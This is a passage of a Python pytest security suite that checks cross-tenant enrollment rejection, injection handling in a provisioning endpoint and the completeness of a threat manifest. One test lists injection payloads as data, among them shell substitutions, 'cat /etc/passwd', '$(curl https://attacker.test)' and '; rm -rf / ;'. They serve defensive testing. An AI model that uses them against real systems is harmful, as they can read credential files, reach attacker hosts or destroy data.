    - Security audit event 'external_agent.cross_tenant_rejected' is emitted.
    - Zero SPIRE entries created for Tenant B's agent.

    Positive Control:
    - Presenting the same token with matching Tenant A and Agent A parameters
      succeeds with 201 Created and creates server-minted SPIFFE ID.
    """
    op_principal_a = api_compat.Principal(tenant="tenant-a", subject="op-alice", email="alice@test.com")
    op_principal_b = api_compat.Principal(tenant="tenant-b", subject="op-bob", email="bob@test.com")
    app.dependency_overrides[api_compat.authenticated_principal] = lambda: op_principal_a

    client = TestClient(app, raise_server_exceptions=False)

    agent_a_id = f"tenant-a-agent-{uuid.uuid4().hex[:6]}"
    agent_b_id = f"tenant-b-agent-{uuid.uuid4().hex[:6]}"
    host_id = f"sensor-host-{uuid.uuid4().hex[:6]}"

    # Pre-register Agent A on Tenant A
    asyncio.run(register_external_agent_handler(
        ExternalAgentRegistrationRequest(agent_id=agent_a_id, host_id=host_id),
        op_principal_a,
    ))
    token_resp_a = asyncio.run(issue_enrollment_token_for_agent(agent_a_id, "tenant-a", op_principal_a, ttl_seconds=3600))
    token_a = token_resp_a.enrollment_token

    # Pre-register Agent B on Tenant B
    asyncio.run(register_external_agent_handler(
        ExternalAgentRegistrationRequest(agent_id=agent_b_id, host_id=host_id),
        op_principal_b,
    ))

    # 1. Negative Probe: Present Tenant A token with Tenant B specified in body
    cross_tenant_payload = {
        "schema_version": "1.0.0",
        "agent_id": agent_a_id,
        "host_id": host_id,
        "tenant_id": "tenant-b",  # Cross-tenant mismatch!
        "key_id": "host-key:amxo-cross-01",
        "key_algorithm": "Ed25519",
        "public_key": TEST_ED25519_PUBKEY,
        "client_nonce": f"nonce-cross-{uuid.uuid4().hex[:20]}",
        "credential_kind": "existing-mtls-identity",
        "credential_scope": "audit-upload-only",
        "credential_bootstrap": "pre-provisioned-out-of-band",
    }

    cross_resp = client.post(
        "/v1/external-agents/enroll",
        headers={"Authorization": f"Bearer {token_a}", "Content-Type": "application/json"},
        json=cross_tenant_payload,
    )
    assert cross_resp.status_code == 403, f"Expected 403 Forbidden for cross-tenant token, got {cross_resp.status_code}: {cross_resp.text}"
    assert "mismatch" in cross_resp.text.lower() or "prohibited" in cross_resp.text.lower()

    # 2. Positive Control: Present Tenant A token with matching Tenant A
    valid_payload = {
        "schema_version": "1.0.0",
        "agent_id": agent_a_id,
        "host_id": host_id,
        "tenant_id": "tenant-a",
        "key_id": "host-key:amxo-valid-01",
        "key_algorithm": "Ed25519",
        "public_key": TEST_ED25519_PUBKEY,
        "client_nonce": f"nonce-valid-{uuid.uuid4().hex[:20]}",
        "credential_kind": "existing-mtls-identity",
        "credential_scope": "audit-upload-only",
        "credential_bootstrap": "pre-provisioned-out-of-band",
    }

    valid_resp = client.post(
        "/v1/external-agents/enroll",
        headers={"Authorization": f"Bearer {token_a}", "Content-Type": "application/json"},
        json=valid_payload,
    )
    assert valid_resp.status_code == 201, valid_resp.text
    assert valid_resp.json()["tenant_id"] == "tenant-a"
    assert valid_resp.json()["enrollment_state"] == "enrolled"


# ---------------------------------------------------------------------------
# Threat 8: calc_hash Injection via Company Name
# ---------------------------------------------------------------------------

def test_probe_threat_8_calc_hash_injection(eap_jwt_env, fresh_tenant_ownership) -> None:
    """Threat 8: calc_hash Shell / SQL / Format Injection Probing.

    Negative:
    - POST /api/v1/environments/provision with company_name containing:
      - "'" (SQL injection quote)
      - '$(id)' (shell command substitution)
      - '`whoami`' (backtick substitution)
      - 'kusari; cat /etc/passwd' (command chain)
      - 'kusari\nadmin: true' (YAML / header injection)
    - Every injection payload MUST return 422 Unprocessable Entity.

    Positive Control:
    - Valid alphanumeric company name ('kusari' or 'valid-corp-99')
      provisions successfully with 201 Created.
    """
    client = TestClient(app, raise_server_exceptions=False)

    injection_payloads = [
        "'",
        "$(id)",
        "`whoami`",
        "kusari' OR '1'='1",
        "kusari; cat /etc/passwd",
        "kusari\nadmin: true",
        "$(curl https://attacker.test)",
        "; rm -rf / ;",
    ]

    for bad_name in injection_payloads:
        resp = client.post(
            "/api/v1/environments/provision",
            json={"company_name": bad_name},
            headers=eap_bearer("alice"),
        )
        assert resp.status_code == 422, (
            f"Expected 422 for injection company_name '{bad_name}', got {resp.status_code}: {resp.text}"
        )

    # Positive Control: valid company name
    valid_name = f"valid-clean-corp-{uuid.uuid4().hex[:6]}"
    valid_resp = client.post(
        "/api/v1/environments/provision",
        json={"company_name": valid_name},
        headers=eap_bearer("alice"),
    )
    assert valid_resp.status_code == 201, f"Expected 201 for valid company_name '{valid_name}', got {valid_resp.status_code}"
    assert valid_resp.json()["company_name"] == valid_name


# ---------------------------------------------------------------------------
# Threat Manifest Guard (Completeness & Integrity Assertion)
# ---------------------------------------------------------------------------

def test_threat_manifest_completeness() -> None:
    """T1 / T9: Assert all 8 threats in THREAT_MANIFEST have corresponding probes and controls.

    If any probe is deleted or unregistered, this manifest guard fails.
    """
    assert len(THREAT_MANIFEST) == 8, f"Expected 8 threats in manifest, found {len(THREAT_MANIFEST)}"

    for threat_id, meta in sorted(THREAT_MANIFEST.items()):
        probe_name = meta["probe"]
        assert probe_name in globals(), f"Threat {threat_id} probe '{probe_name}' is not defined in module!"
        probe_fn = globals()[probe_name]
        assert callable(probe_fn), f"Threat {threat_id} probe '{probe_name}' is not callable!"
        assert meta["positive_control"], f"Threat {threat_id} is missing positive control description!"
        assert meta["mitigation"], f"Threat {threat_id} is missing mitigation description!"
        assert meta["vector"], f"Threat {threat_id} is missing vector description!"


def test_threat_manifest_guard_fails_on_deleted_probe() -> None:
    """Positive control for the manifest guard: verify that removing a probe triggers failure."""
    tampered_manifest = dict(THREAT_MANIFEST)
    tampered_manifest.pop("THREAT-1")

    with pytest.raises(AssertionError):
        assert len(tampered_manifest) == 8, "Expected 8 threats in manifest"

    tampered_manifest_missing_fn = dict(THREAT_MANIFEST)
    tampered_manifest_missing_fn["THREAT-1"] = {
        **THREAT_MANIFEST["THREAT-1"],
        "probe": "non_existent_probe_function_xyz",
    }
    with pytest.raises(AssertionError):
        probe_name = tampered_manifest_missing_fn["THREAT-1"]["probe"]
        assert probe_name in globals(), f"Probe {probe_name} must exist"
